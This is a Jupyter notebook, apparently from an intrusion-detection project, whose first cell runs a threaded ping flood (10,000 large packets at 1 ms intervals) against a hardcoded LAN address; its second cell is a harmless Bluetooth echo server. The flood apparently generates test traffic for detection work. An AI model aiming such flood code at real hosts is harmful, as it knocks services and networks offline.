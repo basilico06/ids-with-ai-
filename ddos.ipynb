{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "192.168.1.15\n"
     ]
    }
   ],
   "source": [
    "from scapy.all import *\n",
    "import pythonping as ping\n",
    "import threading\n",
    "def get_DHCP_broadcast():\n",
    "    \n",
    "    import subprocess\n",
    "    cmd_command = 'ipconfig /renew'\n",
    "    subprocess.Popen(cmd_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n",
    "\n",
    "    while True:\n",
    "        x = sniff(count=1, filter=\"udp and (port 67 or port 68)\")  \n",
    "\n",
    "        \n",
    "        if DHCP in x[0]:\n",
    "            print(x[0][DHCP].options)\n",
    "            for option in x[0][DHCP].options:\n",
    "                if isinstance(option, tuple) and option[0] == 'broadcast_address':\n",
    "                    print(\"DHCP Options:\", x[0][DHCP].options)\n",
    "                    print(\"Broadcast Address:\", option[1])\n",
    "                    return option[1]  \n",
    "            \n",
    "#t=get_DHCP_broadcast()\n",
    "t=\"192.168.1.15\"\n",
    "print(t)\n",
    "def pinger():\n",
    "    ping.ping(t, count=10000, interval=0.001, size=1500,timeout=0 )\n",
    "    \n",
    "list=[]\n",
    "\n",
    "for i in range( 1):\n",
    "    list.append(threading.Thread(target=pinger))\n",
    "    list[i].start()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "\n",
    "import socket\n",
    "bluetooth_socket = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)\n",
    "\n",
    "\n",
    "server_address = ('00:00:00:00:00:00', 9)  \n",
    "bluetooth_socket.bind(server_address)\n",
    "bluetooth_socket.listen(1)  \n",
    "\n",
    "print(\"In attesa di connessioni bluetooth in entrata...\")\n",
    "\n",
    "client_socket, client_address = bluetooth_socket.accept()\n",
    "print(f\"Connessione accettata da: {client_address}\")\n",
    "try:\n",
    "    while True:\n",
    "                    \n",
    "        data = client_socket.recv(1024)\n",
    "        if not data:\n",
    "            break  \n",
    "        print(f\"Dati ricevuti dal client: {data.decode()}\")\n",
    "        message = \"Messaggio ricevuto correttamente!\"\n",
    "        client_socket.send(message.encode())\n",
    "        print(\"Messaggio inviato al client\")\n",
    "except: \n",
    "    print(\"errore\")\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "base",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
